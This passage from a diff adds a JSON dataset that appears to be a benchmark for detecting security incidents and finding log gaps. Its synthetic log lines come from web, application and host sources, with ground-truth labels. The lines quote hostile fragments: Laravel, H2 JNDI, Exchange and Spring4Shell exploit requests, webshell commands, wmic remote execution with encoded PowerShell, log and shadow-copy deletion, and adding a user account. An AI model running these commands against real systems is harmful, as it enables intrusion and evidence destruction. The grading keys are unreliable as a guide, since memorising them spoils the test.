+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1013": {
+   "unit": 1013,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-004",
+   "technique": "Laravel Ignition 反序列化 CVE-2021-3129（phar:// 触发）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/_ignition）",
+     "n_lines": 2,
+     "lines": [
+      "/_ignition {\"solution\":\"MakeViewVariableOptionalSolution\",\"viewFile\":\"phar:///tmp\"} Mozilla/5.0 (Windows NT 10",
+      "/_ignition {\"solution\":\"MakeViewVariableOptionalSolution\",\"viewFile\":\"phar:///tmp\"} Mozilla/5.0 (Windows NT 10"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-156.ops-corp.com/_ignition {\"deserialization\": \"phar://\"} Mozilla/5.0 (Windows NT 10.0; Win64;"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（printf）",
+     "n_lines": 1,
+     "lines": [
+      "printf PD9waHAgPz4= > /var/www/html/i.php <== /bin/sh -c 'printf PD9waHAgPz4=' <== php-fpm: pool www"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（printf）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1018": {
+   "unit": 1018,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-001",
+   "technique": "H2 Console JNDI 驱动加载（/h2-console/login.do 远程类）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/h2-console/login.do）",
+     "n_lines": 2,
+     "lines": [
+      "/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi",
+      "/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-spring-2.ops-corp.com/h2-console/login.do {\"jndi\": \"ldap://10.20.5.19\"} Mozilla/5.0 (Windows NT 11"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（chmod）",
+     "n_lines": 1,
+     "lines": [
+      "chmod +x /tmp/.h2 <== /bin/sh -c 'chmod +x /tmp/.h2' <== /usr/bin/java -jar /opt/app/admin.jar"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（chmod）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1035": {
+   "unit": 1035,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-008",
+   "technique": "Exchange ProxyNotShell 风格（autodiscover SSRF → EWS 写文件）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/autodiscover/autodiscover.json?@a.com/）",
+     "n_lines": 2,
+     "lines": [
+      "/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;",
+      "/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-iis-7.ops-corp.com/autodiscover/autodiscover.json?@a.com/ {\"ssrf\": \"adc\"} Mozilla/5.0 (iPhone; CPU"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wmic）",
+     "n_lines": 1,
+     "lines": [
+      "wmic /node:10.20.3.44 process call create \"cmd.exe /c powershell -enc SQBFAFgA\" cmd.exe cmd.exe /c wmic <== se"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "dns"
+     ],
+     "label": "DNS C2（5d0d7221.srpmfx-b146.org）",
+     "n_lines": 3,
+     "lines": [
+      "5d0d7221.srpmfx-b146.org A 10.10.39.46",
+      "7f1cf47f.srpmfx-b146.org A 10.10.29.52",
+      "bfe3dd82.srpmfx-b146.org A 192.0.2.141"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "full",
+     "n_lines": 7,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "del1",
+     "n_lines": 6,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "DNS C2（5d0d7221.srpmfx-b146.org）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "delweb",
+     "n_lines": 6,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1047": {
+   "unit": 1047,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "日志与卷影清理（wevtutil cl Security + vssadmin delete shadows）",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wevtutil）",
+     "n_lines": 1,
+     "lines": [
+      "wevtutil cl Security && vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c wevtutil cl Security && vss <=="
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（wevtutil）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（wevtutil）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（wevtutil）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（wevtutil）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1048": {
+   "unit": 1048,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-002",
+   "technique": "JSP webshell 交互执行（shell.jsp 传 cmd 参数）",
+   "source_sequence": [
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-tomcat-38.ops-corp.com/uploads/shell.jsp {\"webshell\": \"shell.jsp\", \"cmd\": \"id\"} Mozilla/5.0 (Windo"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id）",
+     "n_lines": 1,
+     "lines": [
+      "id /usr/bin/id id <== /bin/sh -c 'id' <== /usr/local/tomcat/bin/catalina.sh"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（id）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（id）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（id）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（id）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1049": {
+   "unit": 1049,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "",
+   "technique": "PHP webshell 文件管理动作（?act=upload / filemgr）",
+   "source_sequence": [
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-92.ops-corp.com/uploads/up.php {\"upload\": \"shell.php\", \"act\": \"upload\"} Mozilla/5.0 (Macintosh"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（mv）",
+     "n_lines": 1,
+     "lines": [
+      "mv /tmp/php3f2a.tmp /var/www/html/shell.php /bin/mv mv <== /bin/sh -c 'mv /tmp/php3f' <== php-fpm: pool www"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（mv）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（mv）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（mv）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（mv）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1050": {
+   "unit": 1050,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "",
+   "technique": "ASPX webshell 执行 whoami（cmd.aspx）",
+   "source_sequence": [
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-iis-20.ops-corp.com/upload/cmd.aspx {\"webshell\": \"cmd.aspx\", \"cmd\": \"whoami\"} Mozilla/5.0 (Windows"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（whoami）",
+     "n_lines": 1,
+     "lines": [
+      "whoami /all C:\\Windows\\System32\\whoami.exe whoami /all <== cmd.exe /c whoami /all <== w3wp.exe -ap \"DefaultApp"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（whoami）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（whoami）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（whoami）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（whoami）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1073": {
+   "unit": 1073,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-002",
+   "technique": "Spring4Shell 参数绑定 Tomcat 日志写入 JSP (CVE-2022-22965)",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/v3/export）",
+     "n_lines": 2,
+     "lines": [
+      "/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct",
+      "/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-spring-141.ops-corp.com/api/v3/export {\"spring4shell\": \"pipeline.first.prefix\", \"dir\": \"webapps/RO"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（whoami）",
+     "n_lines": 1,
+     "lines": [
+      "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\\app\\export.jar"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wmic）",
+     "n_lines": 1,
+     "lines": [
+      "wmic /node:10.20.10.62 process call create \"cmd.exe /c whoami\" cmd.exe cmd.exe /c wmic /node:10.20.10.62 <== s"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（wmic）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1074": {
+   "unit": 1074,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-002",
+   "technique": "Tomcat Manager 未授权 WAR 部署（PUT war 到 manager/deploy 后执行命令）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/manager/deploy?path=/svc&update=true）",
+     "n_lines": 2,
+     "lines": [
+      "/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1",
+      "/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-tomcat-171.ops-corp.com/manager/deploy?path=/svc&update=true {\"war_deploy\": \"manager/deploy\", \"arc"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cmd.exe）",
+     "n_lines": 1,
+     "lines": [
+      "cmd.exe /c ipconfig /all cmd.exe cmd.exe /c ipconfig /all <== services.exe <== wininit.exe"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cmd.exe）",
+     "n_lines": 1,
+     "lines": [
+      "cmd.exe /c net user /add svc_backup Xr7#pqZ2! cmd.exe cmd.exe /c net user /add svc_backup Xr7#pqZ2! <== servic"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
